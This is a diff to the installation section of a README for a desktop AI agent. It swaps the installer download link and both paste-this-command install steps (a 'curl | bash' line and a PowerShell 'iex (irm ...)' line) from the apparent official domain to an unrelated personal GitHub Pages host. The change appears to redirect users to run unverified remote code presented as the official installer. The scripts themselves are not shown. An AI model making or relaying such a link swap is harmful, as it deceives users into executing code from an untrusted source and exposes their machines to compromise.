@@ -20,7 +20,7 @@ The simplest path: a one-click installer with a guided, point-and-click setup. N
 
 ### 1. Download and install
 
-[Download the Haishui Desktop installer](https://haishui-agent.nousresearch.com/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
+[Download the Haishui Desktop installer](https://aiqinghaiwork163.github.io/haishui-agent/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
 
 ### 2. Connect Nous Portal
 
@@ -49,16 +49,16 @@ Prefer the terminal?
 On macOS/Linux/WSL2/Android, run
 
 ```bash
-curl -fsSL https://haishui-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | bash
 ```
 
 On Windows, run
 
 ```powershell
-iex (irm https://haishui-agent.nousresearch.com/install.ps1)
+iex (irm https://aiqinghaiwork163.github.io/haishui-agent/install.ps1)
 ```
 
-Prefer to review first? Download [`install.sh`](https://haishui-agent.nousresearch.com/install.sh), inspect it, then run it.
+Prefer to review first? Download [`install.sh`](https://aiqinghaiwork163.github.io/haishui-agent/install.sh), inspect it, then run it.
 
 After it finishes, reload your shell:
 
